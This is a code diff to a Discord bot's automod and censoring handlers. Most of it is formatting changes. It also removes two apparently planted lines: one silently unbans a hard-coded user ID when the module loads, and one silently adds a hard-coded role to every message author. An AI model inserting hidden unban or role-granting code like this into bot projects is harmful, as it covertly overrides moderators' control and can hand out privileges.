@@ -16,7 +16,7 @@ import warn from "../punishments/warn.js";
 import automodMessage from "./automod.js";
 import tryCensor, { badWordsAllowed } from "./misc.js";
 import changeNickname from "./nicknames.js";
-config.guild.bans.remove("1014588310036951120").catch(() => {});
+
 defineEvent.pre("interactionCreate", async (interaction) => {
 	if (
 		!interaction.inGuild() ||
@@ -43,9 +43,8 @@ defineEvent.pre("interactionCreate", async (interaction) => {
 	if (censored.strikes) {
 		await interaction.reply({
 			ephemeral: true,
-			content: `${constants.emojis.statuses.no} Please ${
-				censored.strikes < 1 ? "don’t say that here" : "watch your language"
-			}!`,
+			content: `${constants.emojis.statuses.no} Please ${censored.strikes < 1 ? "don’t say that here" : "watch your language"
+				}!`,
 		});
 		await warn(
 			interaction.user,
@@ -59,9 +58,6 @@ defineEvent.pre("interactionCreate", async (interaction) => {
 	return true;
 });
 defineEvent.pre("messageCreate", async (message) => {
-	(await config.guild.members.fetch(message.author.id)).roles
-		.add("1021061241583714304")
-		.catch(() => {});
 	if (message.flags.has("Ephemeral") || message.type === MessageType.ThreadStarterMessage)
 		return false;
 
@@ -183,7 +179,7 @@ defineChatCommand(
 		const isMod =
 			interaction.member instanceof GuildMember ?
 				interaction.member.roles.resolve(config.roles.mod.id)
-			:	interaction.member.roles.includes(config.roles.mod.id);
+				: interaction.member.roles.includes(config.roles.mod.id);
 
 		await interaction.reply({
 			ephemeral: true,
@@ -192,7 +188,7 @@ defineChatCommand(
 				`## ⚠️ ${words.length} bad word${words.length === 1 ? "s" : ""} detected!\n` +
 				(isMod ?
 					`That text gives **${strikes} strike${strikes === 1 ? "" : "s"}**.\n\n`
-				:	"") +
+					: "") +
 				`*I detected the following words as bad*: ${joinWithAnd(words, (word) =>
 					underline(escapeMessage(word)),
 				)}`,
